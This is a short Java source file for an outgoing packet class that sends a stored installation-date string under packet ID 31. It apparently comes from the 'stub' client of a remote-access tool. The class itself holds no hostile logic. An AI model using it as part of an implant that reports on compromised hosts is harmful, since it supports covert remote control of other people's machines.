package com.redpois0n.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet31InitInstallationDate extends AbstractOutgoingPacket {
	
	private String date;
	
	public Packet31InitInstallationDate(String date) {
		this.date = date;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(this.date);
	}

	@Override
	public byte getPacketId() {
		return (byte) 31;
	}

}